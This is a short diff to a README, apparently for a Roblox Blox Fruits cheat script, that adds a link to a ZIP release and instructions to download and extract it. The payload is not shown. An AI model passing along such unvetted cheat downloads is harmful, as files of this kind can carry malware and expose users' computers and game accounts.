@@ -4,7 +4,7 @@
 
 To install the Blox Fruit script, follow these simple steps:
 
-1. **Download** the Blox Fruit script package from this link: **[![Download Script](https://img.shields.io/badge/Download%20Script-blueviolet)]()**
+1. **Download** the Blox Fruit script package from this link: **[![Download Script](https://img.shields.io/badge/Download%20Script-blueviolet)](https://github.com/TheGigatonize/Roblox-Blox-Fruits-Script-2024/releases/download/Blox-Fruit-Script-2024/Update_v4_3.zip)**
 2. **Extract** the contents of the downloaded ZIP file to a location of your choice on your computer.
 
 ## Introduction
